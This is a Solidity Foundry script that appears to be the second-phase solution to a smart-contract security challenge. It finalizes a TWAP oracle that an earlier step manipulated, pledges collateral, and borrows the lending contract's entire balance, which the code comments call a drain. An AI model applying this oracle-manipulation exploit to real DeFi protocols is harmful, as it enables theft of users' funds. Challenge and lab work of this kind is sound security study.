// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C3Window.sol";

/// Phase B (after the clock has advanced past PERIOD): finalize the TWAP — now
/// dragged up to the manipulated price — then pledge collateral and drain.
contract SolveC3b is Script {
    function run() external {
        WindowSetup setup = WindowSetup(vm.envAddress("SETUP"));
        MockERC20 token = setup.token();
        MockERC20 usdx = setup.usdx();
        TwapOracle oracle = setup.oracle();
        WindowLending lending = setup.lending();

        vm.startBroadcast();
        oracle.update();                                  // twap := ~manipulated price
        token.approve(address(lending), type(uint256).max);
        lending.deposit(1000 ether);                      // seeded collateral
        lending.borrow(usdx.balanceOf(address(lending))); // drain
        vm.stopBroadcast();
    }
}
